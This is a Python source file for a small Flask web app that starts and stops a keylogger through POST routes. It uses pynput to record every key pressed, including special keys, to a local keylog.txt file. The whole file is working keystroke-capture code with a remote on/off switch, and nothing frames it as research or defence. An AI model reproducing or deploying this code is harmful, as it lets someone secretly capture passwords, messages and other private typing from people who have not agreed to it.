from flask import Flask, render_template, jsonify
from pynput import keyboard
import threading

app = Flask(__name__)

keylogger_running = False
listener = None  
LOG_FILE = "keylog.txt"

def start_keylogger():
    global keylogger_running, listener

    def on_press(key):
        try:
            with open(LOG_FILE, "a") as file:
                file.write(f"{key.char}")
        except AttributeError:
            with open(LOG_FILE, "a") as file:
                file.write(f"[{key}]")

    def on_release(key):
        if key == keyboard.Key.esc:  
            return False

    if not keylogger_running:
        keylogger_running = True
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()

def stop_keylogger():
    global keylogger_running, listener
    if keylogger_running and listener:
        listener.stop()
        keylogger_running = False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/activate', methods=['POST'])
def activate_keylogger():
    if not keylogger_running:
        threading.Thread(target=start_keylogger, daemon=True).start()
    return jsonify({"status": "Keylogger Activated"})

@app.route('/stop', methods=['POST'])
def stop_keylogger_route():
    stop_keylogger()
    return jsonify({"status": "Keylogger Stopped"})

if __name__ == "__main__":
    app.run(debug=True)
